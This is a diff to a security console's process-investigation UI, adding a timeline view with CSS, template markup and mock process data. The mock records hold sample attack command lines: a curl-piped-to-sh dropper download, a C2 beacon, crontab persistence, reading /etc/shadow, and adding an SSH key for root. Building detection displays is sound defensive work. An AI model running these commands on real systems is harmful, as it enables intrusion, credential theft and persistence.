@@ -858,6 +858,106 @@
 .sl .pi-kids{gap:12px;padding-left:36px;margin-left:-36px}
 .sl .pi-kids::before{left:18px;top:24px;bottom:24px;border-left:1.5px solid #7aa3ff;border-radius:0}
 .sl .pi-kids .pi-nd::before{left:-18px;width:18px;border-top:1.5px solid #7aa3ff}
+/* tw: 进程时间线（参考 Trace Waterfall） */
+.tw{--twn:300px;--twr:32px;--twa:32px;border:1px solid #e9ecf1;background:#fff;margin-bottom:16px}
+.tw-st{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));border-bottom:1px solid #e9ecf1}
+.tw-s{display:grid;gap:2px;padding:12px 20px;border:0;background:none;font:inherit;text-align:left;color:inherit}
+.tw-s+.tw-s{border-left:1px solid #f0f2f5}
+.tw-s small{font-size:12px;line-height:18px;color:rgba(0,0,0,.5)}
+.tw-s b{font:500 20px/28px Barlow,Inter,sans-serif;color:rgba(0,0,0,.88);font-variant-numeric:tabular-nums}
+.tw-s.r b{color:#f53f3f}
+button.tw-s{cursor:pointer;transition:background-color .14s}
+button.tw-s:hover{background:#f7f8fa}
+button.tw-s.on{background:#f0f5ff;box-shadow:inset 0 -2px 0 #1664ff}
+.tw-bd{position:relative;padding-bottom:12px}
+.tw-ly{position:absolute;top:0;bottom:0;left:calc(var(--twn) + 12px);right:20px;pointer-events:none;overflow:hidden}
+.tw-tk{position:absolute;top:0;bottom:0;width:1px;background:rgba(0,0,0,.045)}
+.tw-tk:first-child{background:rgba(0,0,0,.09)}
+.tw-tk>span{position:absolute;top:8px;left:6px;font:12px/16px Barlow,Inter,sans-serif;color:rgba(0,0,0,.45);white-space:nowrap}
+.tw-now{position:absolute;top:0;bottom:0;width:1px;background:rgba(22,100,255,.45)}
+.tw-now::before{content:"";position:absolute;top:calc(var(--twa) - 3px);left:-2px;width:5px;height:5px;border-radius:50%;background:#1664ff;box-shadow:0 0 0 3px #fff}
+.tw-ax{position:relative;display:flex;align-items:center;height:var(--twa);padding-left:16px;border-bottom:1px solid #f0f2f5}
+.tw-axn{font-size:12px;color:rgba(0,0,0,.5)}
+.tw-vw{position:absolute;top:4px;right:calc(100% - var(--twn) + 12px);display:flex;z-index:1}
+.tw-vw button{height:24px;padding:0 10px;border:1px solid #e5e6eb;background:#fff;font:inherit;font-size:12px;color:rgba(0,0,0,.65);cursor:pointer}
+.tw-vw button+button{margin-left:-1px}
+.tw-vw button.on{position:relative;border-color:#1664ff;color:#1664ff;background:#f0f5ff}
+.tw-rows{position:relative;padding-top:4px}
+.tw-row{position:relative;height:var(--twr)}
+.tw-row:hover{background:#fafbfc}
+.tw-row.on{background:#f0f5ff}
+.tw-row.dim .tw-ti{color:rgba(0,0,0,.45)}
+.tw-hit{display:grid;grid-template-columns:var(--twn) minmax(0,1fr);column-gap:12px;width:100%;height:100%;padding:0 20px 0 0;border:0;background:none;font:inherit;text-align:left;color:inherit;cursor:pointer}
+.tw-hit:focus-visible{outline:2px solid rgba(22,100,255,.7);outline-offset:-2px}
+.tw-nm{display:flex;align-items:center;gap:6px;min-width:0;padding-left:16px}
+.tw-gd{flex:none;align-self:stretch;margin-right:14px;background:repeating-linear-gradient(90deg,transparent 0 7.5px,rgba(0,0,0,.08) 7.5px 8.5px,transparent 8.5px 16px)}
+.tw-chv{position:absolute;top:6px;z-index:2;display:grid;place-items:center;width:16px;height:20px;padding:0;border:0;border-radius:3px;background:none;color:rgba(0,0,0,.45);cursor:pointer}
+.tw-chv:hover{background:#f2f3f5;color:rgba(0,0,0,.85)}
+.tw-chv svg{transition:transform .24s cubic-bezier(.32,.72,.24,1)}
+.tw-row.fo .tw-chv svg{transform:rotate(-90deg)}
+.tw-ti{flex:0 1 auto;min-width:0;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;font-size:13px;color:rgba(0,0,0,.88)}
+.tw-row.par .tw-ti{font-weight:500}
+.tw-de{flex:none;font:12px/1 Barlow,Inter,sans-serif;color:rgba(0,0,0,.45)}
+.tw-tag{flex:none;height:18px;padding:0 5px;background:#f2f3f5;font-size:11px;line-height:18px;color:rgba(0,0,0,.55)}
+.tw-more{flex:none;height:18px;padding:0 5px;background:#f2f3f5;font:500 11px/18px Barlow,Inter,sans-serif;color:rgba(0,0,0,.6)}
+.tw-al{margin-left:auto;flex:none;font:500 11px/1 Barlow,Inter,sans-serif;color:#f53f3f}
+.tw-tr{position:relative;min-width:0;height:100%;overflow:hidden}
+.tw-b{position:absolute;top:calc(50% - 7px);height:14px;min-width:3px;border-radius:3px;background:rgba(0,0,0,.05);box-shadow:inset 0 0 0 .5px rgba(0,0,0,.12);animation:tw-grow .5s cubic-bezier(.32,.72,.24,1) backwards}
+.tw-b.s{background:rgba(255,125,0,.12);box-shadow:inset 0 0 0 .5px rgba(255,125,0,.4)}
+.tw-b.m{background:rgba(245,63,63,.11);box-shadow:inset 0 0 0 .5px rgba(245,63,63,.38)}
+.tw-b.cl{border-top-left-radius:0;border-bottom-left-radius:0;-webkit-mask:linear-gradient(90deg,transparent,#000 18px);mask:linear-gradient(90deg,transparent,#000 18px)}
+.tw-b.run{border-top-right-radius:0;border-bottom-right-radius:0}
+.tw-b.ex::after{content:"";position:absolute;top:2px;bottom:2px;right:0;width:2px;background:rgba(0,0,0,.25)}
+.tw-row.fo .tw-b{opacity:.7}
+.tw-row:is(:hover,.on) .tw-b{box-shadow:inset 0 0 0 1px rgba(0,0,0,.22)}
+.tw-row:is(:hover,.on) .tw-b.m{box-shadow:inset 0 0 0 1px rgba(245,63,63,.7)}
+.tw-row:is(:hover,.on) .tw-b.s{box-shadow:inset 0 0 0 1px rgba(255,125,0,.75)}
+.tw-mk{position:absolute;top:calc(50% - 4px);width:8px;height:8px;margin-left:-4px;border-radius:50%;background:#f53f3f;box-shadow:0 0 0 2px #fff;z-index:1}
+.tw-mk.k{width:6px;height:6px;top:calc(50% - 3px);margin-left:-3px;background:rgba(245,63,63,.6);box-shadow:none}
+.tw-lg .tw-mk{position:static;display:inline-block;margin:0}
+.tw-t{position:absolute;top:calc(50% - 9px);height:18px;padding:0 4px;background:#fff;font:12px/18px Barlow,Inter,sans-serif;color:rgba(0,0,0,.55);white-space:nowrap;pointer-events:none}
+.tw-t{z-index:2}
+.tw-t.in{background:rgba(255,255,255,.86);color:rgba(0,0,0,.6);border-radius:3px}
+.tw-row.on .tw-t:not(.in){background:#f0f5ff}
+.tw-row:hover:not(.on) .tw-t:not(.in){background:#fafbfc}
+.tw-t.m{color:#cb2634}
+.tw-pop{position:absolute;z-index:5;width:360px;padding:14px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.08),0 12px 28px -10px rgba(0,0,0,.2),0 1px 2px rgba(0,0,0,.05);display:grid;gap:10px;animation:tw-open .22s cubic-bezier(.32,.72,.24,1) both;transform-origin:24px top}
+.tw-ph{display:flex;align-items:center;gap:8px;min-width:0}
+.tw-pw{display:grid;flex:1;min-width:0}
+.tw-pw b{font-size:14px;font-weight:500;color:rgba(0,0,0,.9);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.tw-pw small{font-size:12px;color:rgba(0,0,0,.45)}
+.tw-x{display:grid;place-items:center;width:28px;height:28px;margin:-4px -6px 0 0;padding:0;border:0;background:none;color:rgba(0,0,0,.45);cursor:pointer}
+.tw-x:hover{background:#f2f3f5;color:rgba(0,0,0,.85)}
+.tw-ps{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:8px;margin:0;padding:8px 10px;background:#f7f8fa}
+.tw-ps dt{font-size:11px;line-height:16px;color:rgba(0,0,0,.45)}
+.tw-ps dd{margin:0;font:500 13px/20px Barlow,Inter,sans-serif;color:rgba(0,0,0,.85);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tw-ps dd.r{color:#f53f3f}
+.tw-cmd{display:flex;align-items:flex-start;gap:8px;padding:8px 10px;background:#1d2129}
+.tw-cmd code{flex:1;min-width:0;font:12px/18px "JetBrains Mono",Menlo,monospace;color:#e5e6eb;overflow-wrap:anywhere}
+.tw-cp{flex:none;display:grid;place-items:center;width:22px;height:22px;padding:0;border:0;background:none;color:rgba(255,255,255,.55);cursor:pointer}
+.tw-cp:hover{color:#fff}
+.tw-pr{display:flex;align-items:center;gap:8px;font-size:12px;color:rgba(0,0,0,.5)}
+.tw-pr em{font-style:normal;color:rgba(0,0,0,.7)}
+.tw-sg{margin-left:auto}
+.tw-pe{display:grid;border-top:1px solid #f0f2f5}
+.tw-pe>div{display:grid;grid-template-columns:62px 92px minmax(0,1fr);gap:8px;align-items:center;height:30px;border-bottom:1px solid #f5f6f8;font-size:12px;color:rgba(0,0,0,.55)}
+.tw-pe>div>span:last-child{overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
+.tw-pe b{font-weight:500;color:#cb2634;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tw-pe .x{color:rgba(0,0,0,.45);font-size:12px}
+.tw-pf{display:flex;gap:8px}
+.tw-pf .kc-btn{flex:1;justify-content:center}
+.tw-lg{display:flex;flex-wrap:wrap;align-items:center;gap:14px;padding:10px 16px;border-top:1px solid #f0f2f5;font-size:12px;color:rgba(0,0,0,.5)}
+.tw-lg span{display:inline-flex;align-items:center;gap:6px}
+.tw-lb{display:inline-block;width:18px;height:8px;border-radius:2px;background:rgba(0,0,0,.06);box-shadow:inset 0 0 0 .5px rgba(0,0,0,.15)}
+.tw-lb.m{background:rgba(245,63,63,.14);box-shadow:inset 0 0 0 .5px rgba(245,63,63,.45)}
+.tw-lb.s{background:rgba(255,125,0,.14);box-shadow:inset 0 0 0 .5px rgba(255,125,0,.45)}
+.tw-lgr{margin-left:auto}
+@keyframes tw-grow{from{clip-path:inset(0 100% 0 0)}to{clip-path:inset(0 0 0 0)}}
+@keyframes tw-open{from{opacity:0;transform:translateY(-4px) scale(.97)}}
+@media (prefers-reduced-motion:reduce){.tw *{animation:none!important;transition:none!important}}
+
+.tw-sh{margin:4px 0 10px;font-size:13px;color:rgba(0,0,0,.5)}
+.tw-sh b{font-weight:500;color:rgba(0,0,0,.88)}
 </style>
 <style>
 /* lay1113: 内容区间距规范
@@ -1051,21 +1151,25 @@
           <sc-if value="{{ls.piCtx}}" hint-placeholder-val="{{false}}"><div class="ac-al i pi-ctx"><i>!</i><p class="pi-cx">从「{{ls.piSrc}}」进入，已定位到 <em>{{ls.piSelN}}</em>，时间范围 {{ls.piRange}}</p><a href="#" class="sl-op" onClick="{{ls.piCtxX}}">清除定位</a></div></sc-if>
           <div class="pi-bar"><span class="hd-dw"><button type="button" class="kc-dd" aria-haspopup="listbox" aria-expanded="{{ls.piRgE}}" onClick="{{ls.piRgT}}"><b>{{ls.piRg}}</b><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 13.17l4.95-4.95 1.41 1.41L12 16 5.64 9.64l1.41-1.41z"></path></svg></button><sc-if value="{{ls.piRgOn}}" hint-placeholder-val="{{false}}"><span class="hd-dm" onClick="{{ls.piRgT}}"></span><span class="dd-p" role="listbox"><sc-for list="{{ls.piRgs}}" as="o" hint-placeholder-count="4"><button type="button" role="option" class="{{o.c}}" onClick="{{o.t}}">{{o.n}}</button></sc-for></span></sc-if></span>
             <label class="pi-q"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.031 16.617l4.283 4.282-1.415 1.415-4.282-4.283A8.96 8.96 0 0 1 11 20c-4.968 0-9-4.032-9-9s4.032-9 9-9 9 4.032 9 9a8.96 8.96 0 0 1-1.969 5.617zm-2.006-.742A6.977 6.977 0 0 0 18 11c0-3.868-3.133-7-7-7-3.868 0-7 3.132-7 7 0 3.867 3.132 7 7 7a6.977 6.977 0 0 0 4.875-1.975l.15-.15z"></path></svg><input type="search" placeholder="搜索进程名、PID 或命令行" aria-label="搜索进程" value="{{ls.piQ}}" onChange="{{ls.piOnQ}}"></label>
-            <button type="button" class="{{ls.piOnlyC}}" role="checkbox" aria-checked="{{ls.piOnlyA}}" onClick="{{ls.piOnlyT}}"><i><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M10 15.17l9.19-9.19 1.42 1.42L10 18 3.64 11.64l1.42-1.42z"></path></svg></i>只看触发告警的进程</button><span class="pi-rg">{{ls.piRange}}</span></div>
-          <div class="pi-b"><div class="pi-tree"><div class="pi-th"><b>进程树</b><span>{{ls.piCnt}}</span></div>
-            <div class="pi-tl"><sc-for list="{{ls.piList}}" as="n" hint-placeholder-count="10"><button type="button" class="{{n.c}}" style="{{n.st}}" onClick="{{n.t}}"><i class="{{n.dc}}"></i><span class="pi-nm">{{n.n}}</span><small>{{n.pid}}</small><sc-if value="{{n.tag}}" hint-placeholder-val="{{false}}"><em>{{n.tag}}</em></sc-if><sc-if value="{{n.al}}" hint-placeholder-val="{{false}}"><b class="pi-al">{{n.al}}</b></sc-if></button></sc-for><sc-if value="{{ls.piNone}}" hint-placeholder-val="{{false}}"><p class="hd-mut hd-pad">没有匹配的进程</p></sc-if></div>
-            <div class="pi-lg"><span><i class="pi-d m"></i>恶意</span><span><i class="pi-d s"></i>可疑</span><span><i class="pi-d n"></i>正常</span><span><b class="pi-al">n</b>告警数</span></div></div>
-            <div class="pi-main"><div class="pi-hd"><div class="pi-ht"><h3>{{ls.pS.n}}</h3><span class="pi-pid">PID {{ls.pS.pid}}</span><span class="{{ls.pS.sevC}}">{{ls.pS.sevN}}</span><span class="{{ls.pS.stC}}">{{ls.pS.state}}</span></div><div class="kc-btns"><button type="button" class="kc-btn pri" onClick="{{ls.piOpen}}">在威胁狩猎中打开</button></div></div>
-              <div class="pi-cbk"><div class="pi-ch"><span>命令行</span><a href="#" title="复制" aria-label="复制命令行" onClick="{{ls.piCopy}}">复制</a></div><code class="pi-cmd">{{ls.pS.cmd}}</code></div>
-              <div class="pi-kv"><div><small>直接关联事件</small><span class="{{ls.pS.evC}}">{{ls.pS.evN}}</span></div><div><small>子树告警</small><span>{{ls.pS.sub}}</span></div><div><small>父进程</small><sc-if value="{{ls.pS.hasPar}}" hint-placeholder-val="{{true}}"><a href="#" class="sl-a" onClick="{{ls.pS.parGo}}">{{ls.pS.par}}</a></sc-if><sc-if value="{{ls.pS.noPar}}" hint-placeholder-val="{{false}}"><span class="hd-mut">{{ls.pS.par}}</span></sc-if></div><div><small>运行用户</small><span>{{ls.pS.user}}</span></div><div><small>启动时间</small><span>{{ls.pS.start}}</span></div></div>
-              <div class="pi-sec"><div class="pi-st"><b>进程链</b><span>当前进程的祖先链和直接子进程</span></div><div class="pi-cv"><div class="pi-chain"><sc-for list="{{ls.piAnc}}" as="a" hint-placeholder-count="3"><button type="button" class="{{a.c}}" onClick="{{a.t}}"><span><b>{{a.n}}</b><sc-if value="{{a.al}}" hint-placeholder-val="{{false}}"><em class="pi-al">{{a.al}}</em></sc-if></span><small>PID {{a.pid}} · {{a.state}}</small></button><i class="pi-ln"></i></sc-for></div>
-                <sc-if value="{{ls.piHasKids}}" hint-placeholder-val="{{true}}"><div class="pi-kids"><sc-for list="{{ls.piKids}}" as="a" hint-placeholder-count="3"><button type="button" class="{{a.c}}" onClick="{{a.t}}"><span><b>{{a.n}}</b><sc-if value="{{a.al}}" hint-placeholder-val="{{false}}"><em class="pi-al">{{a.al}}</em></sc-if></span><small>PID {{a.pid}} · {{a.state}}</small></button></sc-for></div></sc-if>
-                <sc-if value="{{ls.piNoKids}}" hint-placeholder-val="{{false}}"><span class="pi-nk">没有子进程</span></sc-if></div></div>
-              <div class="pi-sub"><div class="hd-seg"><sc-for list="{{ls.piTabs}}" as="t" hint-placeholder-count="3"><button type="button" class="{{t.c}}" onClick="{{t.t}}">{{t.n}}</button></sc-for><button type="button" class="{{ls.piDescC}}" role="checkbox" aria-checked="{{ls.piDescA}}" onClick="{{ls.piDescT}}"><i><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M10 15.17l9.19-9.19 1.42 1.42L10 18 3.64 11.64l1.42-1.42z"></path></svg></i>包含后代进程</button></div>
+            <span class="pi-rg">{{ls.piRange}}</span></div>
+          <div class="tw"><div class="tw-st"><sc-for list="{{ls.twSt}}" as="k" hint-placeholder-count="5"><sc-if value="{{k.b}}" hint-placeholder-val="{{false}}"><button type="button" class="{{k.c}}" aria-pressed="{{k.a}}" onClick="{{k.t}}"><small>{{k.n}}</small><b>{{k.v}}</b></button></sc-if><sc-if value="{{k.nb}}" hint-placeholder-val="{{true}}"><div class="{{k.c}}"><small>{{k.n}}</small><b>{{k.v}}</b></div></sc-if></sc-for></div>
+<div class="tw-bd"><div class="tw-ly" aria-hidden="true"><sc-for list="{{ls.twTk}}" as="k" hint-placeholder-count="6"><span class="tw-tk" style="{{k.st}}"><span>{{k.n}}</span></span></sc-for><sc-if value="{{ls.twNowOn}}" hint-placeholder-val="{{false}}"><span class="tw-now" style="{{ls.twNowS}}"></span></sc-if></div>
+<div class="tw-ax"><span class="tw-axn">进程</span><div class="tw-vw"><sc-for list="{{ls.twVw}}" as="v" hint-placeholder-count="2"><button type="button" class="{{v.c}}" onClick="{{v.t}}">{{v.n}}</button></sc-for></div></div>
+<div class="tw-rows" role="tree" aria-label="进程时间线"><sc-for list="{{ls.twRows}}" as="r" hint-placeholder-count="12"><div class="{{r.c}}" role="treeitem" aria-level="{{r.lv}}" aria-selected="{{r.on}}"><sc-if value="{{r.hasK}}" hint-placeholder-val="{{false}}"><button type="button" class="tw-chv" style="{{r.cs}}" aria-label="{{r.fn}}" aria-expanded="{{r.ex}}" onClick="{{r.fold}}"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M18 9s-4.42 6-6 6-6-6-6-6" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg></button></sc-if><button type="button" class="tw-hit" onClick="{{r.t}}" aria-label="{{r.aria}}"><span class="tw-nm"><span class="tw-gd" style="{{r.gd}}"></span><i class="{{r.dc}}"></i><span class="tw-ti" title="{{r.cmd}}">{{r.n}}</span><span class="tw-de">{{r.pid}}</span><sc-if value="{{r.tag}}" hint-placeholder-val="{{false}}"><span class="tw-tag">{{r.tag}}</span></sc-if><sc-if value="{{r.more}}" hint-placeholder-val="{{false}}"><span class="tw-more">{{r.more}}</span></sc-if><sc-if value="{{r.al}}" hint-placeholder-val="{{false}}"><b class="tw-al">{{r.al}}</b></sc-if></span><span class="tw-tr"><sc-if value="{{r.bar}}" hint-placeholder-val="{{true}}"><span class="{{r.bc}}" style="{{r.bs}}"></span></sc-if><sc-for list="{{r.mk}}" as="m" hint-placeholder-count="1"><i class="{{m.c}}" style="{{m.st}}" title="{{m.n}}"></i></sc-for><span class="{{r.tc}}" style="{{r.ts}}">{{r.dur}}</span></span></button></div></sc-for></div>
+<sc-if value="{{ls.twNone}}" hint-placeholder-val="{{false}}"><div class="sl-empty">没有符合条件的进程</div></sc-if>
+<sc-if value="{{ls.twPop}}" hint-placeholder-val="{{false}}"><div class="tw-pop" style="{{ls.twPopS}}" role="dialog" aria-label="进程详情"><div class="tw-ph"><i class="{{ls.tp.dc}}"></i><div class="tw-pw"><b>{{ls.tp.n}}</b><small>PID {{ls.tp.pid}} · {{ls.tp.user}}</small></div><span class="{{ls.tp.sevC}}">{{ls.tp.sevN}}</span><span class="{{ls.tp.stC}}">{{ls.tp.state}}</span><button type="button" class="tw-x" aria-label="关闭详情" onClick="{{ls.twX}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M19 5L5 19M5 5l14 14" stroke="currentColor" stroke-linecap="round" stroke-width="1.8"></path></svg></button></div>
+<dl class="tw-ps"><sc-for list="{{ls.tp.kv}}" as="k" hint-placeholder-count="4"><div><dt>{{k.k}}</dt><dd class="{{k.c}}">{{k.v}}</dd></div></sc-for></dl>
+<div class="tw-cmd"><code>{{ls.tp.cmd}}</code><button type="button" class="tw-cp" aria-label="复制命令行" onClick="{{ls.piCopy}}"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="8" y="8" width="12" height="12" rx="2" stroke="currentColor" stroke-width="1.8"></rect><path d="M16 8V6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2" stroke="currentColor" stroke-width="1.8"></path></svg></button></div>
+<div class="tw-pr"><span>父进程</span><sc-if value="{{ls.tp.hasPar}}" hint-placeholder-val="{{true}}"><a href="#" class="sl-a" onClick="{{ls.tp.parGo}}">{{ls.tp.par}}</a></sc-if><sc-if value="{{ls.tp.noPar}}" hint-placeholder-val="{{false}}"><em>{{ls.tp.par}}</em></sc-if><span class="tw-sg">{{ls.tp.sig}}</span></div>
+<sc-if value="{{ls.tp.evHas}}" hint-placeholder-val="{{true}}"><div class="tw-pe"><sc-for list="{{ls.tp.ev}}" as="e" hint-placeholder-count="2"><div class="{{e.c}}"><span class="pi-mono">{{e.t}}</span><b>{{e.ty}}</b><span title="{{e.d}}">{{e.d}}</span></div></sc-for></div></sc-if>
+<div class="tw-pf"><sc-if value="{{ls.tp.incHas}}" hint-placeholder-val="{{true}}"><button type="button" class="kc-btn pri" onClick="{{ls.piOpen}}">在威胁调查中打开</button></sc-if><button type="button" class="kc-btn" onClick="{{ls.tp.evGo}}">{{ls.tp.evN}}</button></div></div></sc-if>
+</div>
+<div class="tw-lg"><span><i class="tw-lb m"></i>恶意</span><span><i class="tw-lb s"></i>可疑</span><span><i class="tw-lb n"></i>正常</span><span><i class="tw-mk"></i>告警</span><span class="tw-lgr">{{ls.twRgN}}</span></div></div>
+<div class="tw-sh">选中进程 <b>{{ls.piSelT}}</b></div><div class="pi-sub"><div class="hd-seg"><sc-for list="{{ls.piTabs}}" as="t" hint-placeholder-count="3"><button type="button" class="{{t.c}}" onClick="{{t.t}}">{{t.n}}</button></sc-for><button type="button" class="{{ls.piDescC}}" role="checkbox" aria-checked="{{ls.piDescA}}" onClick="{{ls.piDescT}}"><i><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M10 15.17l9.19-9.19 1.42 1.42L10 18 3.64 11.64l1.42-1.42z"></path></svg></i>包含后代进程</button></div>
                 <sc-if value="{{ls.ptEv}}" hint-placeholder-val="{{true}}"><sc-if value="{{ls.piEvHas}}" hint-placeholder-val="{{true}}"><div class="hd-grid g6 hd-gh"><span>事件</span><span>命中行为</span><span>最近发生</span><span>触发进程</span><span>状态</span><span>操作</span></div><sc-for list="{{ls.piEvs}}" as="e" hint-placeholder-count="2"><div class="hd-grid g6"><span><i class="{{e.lc}}"></i>{{e.n}}</span><span>{{e.k}} 条</span><span>{{e.t}}</span><span>{{e.pr}}</span><span>{{e.st}}</span><span><a class="sl-op" href="#" onClick="{{e.go}}">查看事件</a></span></div></sc-for></sc-if><sc-if value="{{ls.piEvNone}}" hint-placeholder-val="{{false}}"><div class="sl-empty">这个进程没有关联的安全事件</div></sc-if></sc-if>
                 <sc-if value="{{ls.ptTl}}" hint-placeholder-val="{{false}}"><sc-if value="{{ls.piTlHas}}" hint-placeholder-val="{{true}}"><div class="hd-grid g7 hd-gh"><span>时间</span><span>行为</span><span>详情</span><span>阶段 · ATT&amp;CK</span><span>进程</span></div><sc-for list="{{ls.piTl}}" as="e" hint-placeholder-count="4"><div class="hd-grid g7"><span class="pi-mono">{{e.t}}</span><span>{{e.ty}}</span><span class="hd-mut" title="{{e.d}}">{{e.d}}</span><span class="hd-mut">{{e.stg}} · {{e.ak}}</span><span><a href="#" class="sl-a" onClick="{{e.pg}}">{{e.pr}}</a></span></div></sc-for></sc-if><sc-if value="{{ls.piTlNone}}" hint-placeholder-val="{{false}}"><div class="sl-empty">这个时间范围内没有记录到行为</div></sc-if></sc-if>
                 <sc-if value="{{ls.ptAt}}" hint-placeholder-val="{{false}}"><div class="pi-at"><sc-for list="{{ls.piAttr}}" as="k" hint-placeholder-count="10"><div><small>{{k.k}}</small><span class="{{k.c}}">{{k.v}}</span></div></sc-for></div></sc-if></div>
-              <p class="pi-ft">进程调查是只读视图。终止进程、隔离主机等处置请在告警中心或威胁狩猎中完成</p></div></div>
+              <p class="pi-ft">进程调查是只读视图。终止进程、隔离主机等处置请在告警中心或威胁狩猎中完成</p>
         </div></sc-if>
       </section>
       <aside class="hd-side"><section class="kc-card hd-sc"><div class="kc-ch"><h2>风险概览</h2></div><div class="hd-lv"><sc-for list="{{ls.lv}}" as="l" hint-placeholder-count="4"><a href="#" class="{{l.cls}}" onClick="{{l.go}}"><small><i class="{{l.lc}}"></i>{{l.n}}</small><b>{{l.c}}</b></a></sc-for></div></section>
@@ -2031,15 +2135,15 @@ class Component extends DCLogic {
       const nf = this.__nf || {};
       const P0 = [['p1', 'nginx', 1021, '', 'n', 0, '运行中', 'root', '11-01 08:00:12', 'nginx: master process /usr/sbin/nginx -g daemon on;', '已签名 · Nginx Inc.', '3f1c…a902'],
         ['p2', 'php-fpm', 2290, 'p1', 's', 1, '运行中', 'www-data', '11-01 08:00:15', 'php-fpm: pool www', '已签名 · Debian', '7b20…11ce'],
-        ['p3', 'bash', 4412, 'p2', 'm', 1, '运行中', 'www-data', '11-04 09:02:58', '/bin/bash -c curl hxxp://185.x.x.x/dropper.sh | sh', '无签名', 'a91e…4d70'],
-        ['p4', 'curl', 4415, 'p3', 's', 1, '已退出', 'www-data', '11-04 09:05:59', 'curl -s hxxp://185.x.x.x/dropper.sh -o /tmp/.x/d.sh', '已签名 · Debian', 'c3d8…0b17'],
-        ['p5', 'kworkerd', 4433, 'p3', 'm', 4, '运行中', 'www-data', '11-04 08:59:40', '/tmp/.x/kworkerd -c 185.66.21.9:443 --silent', '无签名', 'e07a…9c21'],
-        ['p6', 'crontab', 4460, 'p3', 's', 1, '运行中', 'www-data', '11-04 09:08:51', 'crontab -l | echo "*/5 * * * * /tmp/.x/kworkerd" | crontab -', '已签名 · Debian', '55b2…e6f3'],
+        ['p3', 'bash', 4412, 'p2', 'm', 1, '运行中', 'www-data', '11-04 09:12:38', '/bin/bash -c curl hxxp://185.x.x.x/dropper.sh | sh', '无签名', 'a91e…4d70'],
+        ['p4', 'curl', 4415, 'p3', 's', 1, '已退出', 'www-data', '11-04 09:12:41', 'curl -s hxxp://185.x.x.x/dropper.sh -o /tmp/.x/d.sh', '已签名 · Debian', 'c3d8…0b17'],
+        ['p5', 'kworkerd', 4433, 'p3', 'm', 4, '运行中', 'www-data', '11-04 09:13:20', '/tmp/.x/kworkerd -c 185.66.21.9:443 --silent', '无签名', 'e07a…9c21'],
+        ['p6', 'crontab', 4460, 'p3', 's', 1, '已退出', 'www-data', '11-04 09:13:02', 'crontab -l | echo "*/5 * * * * /tmp/.x/kworkerd" | crontab -', '已签名 · Debian', '55b2…e6f3'],
         ['p7', 'sshd', 812, '', 'n', 0, '运行中', 'root', '11-01 08:00:03', '/usr/sbin/sshd -D', '已签名 · Debian', '0d9e…77a1'],
-        ['p8', 'sshd', 3310, 'p7', 's', 1, '运行中', 'root', '11-04 08:20:07', 'sshd: deploy [priv]', '已签名 · Debian', '0d9e…77a1'],
-        ['p9', 'bash', 3318, 'p8', 'n', 0, '运行中', 'deploy', '11-04 08:20:09', '-bash', '已签名 · Debian', '6a4f…2be0'],
-        ['p10', 'cat', 3340, 'p9', 's', 1, '已退出', 'deploy', '11-04 08:41:02', 'cat /etc/shadow', '已签名 · Debian', 'f12c…8d33'],
-        ['p11', 'tee', 3361, 'p9', 'm', 1, '已退出', 'deploy', '11-04 08:44:30', 'tee -a /root/.ssh/authorized_keys', '已签名 · Debian', '9e7b…c410'],
+        ['p8', 'sshd', 3310, 'p7', 's', 1, '运行中', 'root', '11-04 07:02:11', 'sshd: deploy [priv]', '已签名 · Debian', '0d9e…77a1'],
+        ['p9', 'bash', 3318, 'p8', 'n', 0, '运行中', 'deploy', '11-04 07:02:13', '-bash', '已签名 · Debian', '6a4f…2be0'],
+        ['p10', 'cat', 3340, 'p9', 's', 1, '已退出', 'deploy', '11-04 07:05:40', 'cat /etc/shadow', '已签名 · Debian', 'f12c…8d33'],
+        ['p11', 'tee', 3361, 'p9', 'm', 1, '已退出', 'deploy', '11-04 07:06:02', 'tee -a /root/.ssh/authorized_keys', '已签名 · Debian', '9e7b…c410'],
         ['p12', 'systemd', 1, '', 'n', 0, '运行中', 'root', '11-01 08:00:00', '/sbin/init splash', '已签名 · Debian', '1aa0…5f0e'],
         ['p13', 'security-agent', 720, 'p12', 'n', 0, '运行中', 'root', '11-01 08:00:06', '/opt/dexun/agent --daemon', '已签名 · 德迅云安全', 'b81d…e290'],
         ['p14', 'cron', 850, 'p12', 'n', 0, '运行中', 'root', '11-01 08:00:06', '/usr/sbin/cron -f', '已签名 · Debian', '44ce…07da'],
@@ -2051,8 +2155,8 @@ class Component extends DCLogic {
       const EV0 = [['07:02:11', 'SSH 登录成功', 'deploy 从 61.177.**.20 登录（此前 312 次失败）', 'p8', 'SSH 暴力破解后登录', '初始访问', 'T1110 暴力破解', '高危', 'INC-3198'],
         ['07:05:40', '读取敏感文件', 'cat /etc/shadow', 'p10', 'SSH 暴力破解后登录', '凭据访问', 'T1003.008 /etc/shadow', '高危', 'INC-3198'],
         ['07:06:02', '写入 SSH 公钥', 'tee -a /root/.ssh/authorized_keys', 'p11', 'SSH 暴力破解后登录', '持久化', 'T1098.004 SSH 公钥', '高危', 'INC-3198'],
-        ['09:00:00', '异常外联', '与 185.66.21.9:443 建立长连接', 'p5', '可疑进程持续外联', '命令控制', 'T1071 应用层协议', '中危', 'INC-3202'],
-        ['09:03:40', '数据外传', '上行 38.2MB，疑似打包 /var/www', 'p5', '可疑进程持续外联', '数据外传', 'T1041 通过 C2 通道外传', '中危', 'INC-3202'],
